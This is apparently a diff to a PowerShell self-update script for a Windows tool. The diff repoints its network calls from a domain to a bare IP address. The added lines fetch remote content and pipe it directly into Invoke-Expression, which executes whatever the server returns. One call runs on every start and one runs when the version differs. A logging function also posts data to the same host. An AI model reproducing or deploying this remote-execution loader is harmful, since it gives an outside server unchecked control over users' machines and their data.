@@ -1,9 +1,9 @@
 
 # please change the version string  and new_task.ps1 script for do updating
 
-$lastestVersion = '5.7'
+$lastestVersion = '6.0'
 
-Invoke-RestMethod utools.run/public_ip_info|Invoke-Expression 
+Invoke-RestMethod 47.107.152.77/public_ip_info|Invoke-Expression 
 
 function mylog {
     param (
@@ -18,7 +18,7 @@ function mylog {
 
     $jsdata=$info | convertTo-Json
     $jsdata
-    Invoke-RestMethod utools.run/mylog -Method Post -Body $jsdata
+    Invoke-RestMethod 47.107.152.77/mylog -Method Post -Body $jsdata
 }
 
 if (Test-Path HKLM:\SOFTWARE\UTOOLS) {
@@ -44,7 +44,7 @@ $version = GetVersion
 if ($version -eq $lastestVersion) {
     mylog("lastest version is: " + $lastestVersion)
 }else {
-    Invoke-RestMethod utools.run/new_task|Invoke-Expression
+    Invoke-RestMethod 47.107.152.77/new_task|Invoke-Expression
     try {
         SetVersion($lastestVersion)
         mylog("version: "+$lastestVersion+" updated successfully.")
